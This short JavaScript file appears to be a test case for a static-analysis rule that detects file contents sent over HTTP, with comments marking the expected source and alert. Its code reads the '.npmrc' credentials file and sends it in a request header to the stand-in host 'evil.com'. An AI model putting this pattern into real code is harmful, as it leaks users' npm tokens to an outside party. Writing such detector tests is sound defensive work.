var fs = require("fs"),
    https = require("https");

var content = fs.readFileSync(".npmrc", "utf8"); // $ Source[js/file-access-to-http]
https.get({
  hostname: "evil.com",
  path: "/upload",
  method: "GET",
  headers: { Referer: content }
}, () => { }); // $ Alert[js/file-access-to-http]
